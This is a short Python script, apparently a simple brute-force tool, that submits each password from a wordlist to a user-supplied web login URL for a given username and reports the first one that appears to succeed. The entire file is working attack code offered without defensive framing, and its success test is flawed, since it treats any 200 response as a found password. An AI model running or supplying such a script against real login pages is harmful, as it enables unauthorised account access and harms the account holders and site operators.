import requests

def start_brute_force():
    url = input("Enter the login URL: ")
    username = input("Enter the username: ")
    wordlist_file = input("Enter path to password wordlist file: ")

    try:
        with open(wordlist_file, 'r') as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print("[!] Wordlist file not found.")
        return

    for password in passwords:
        password = password.strip()
        print(f"[*] Trying password: {password}")
        
        response = requests.post(url, data={'username': username, 'password': password})
        
        if "Welcome" in response.text or response.status_code == 200:
            print(f"[+] Password FOUND: {password}")
            break
    else:
        print("[-] Password not found in wordlist.")
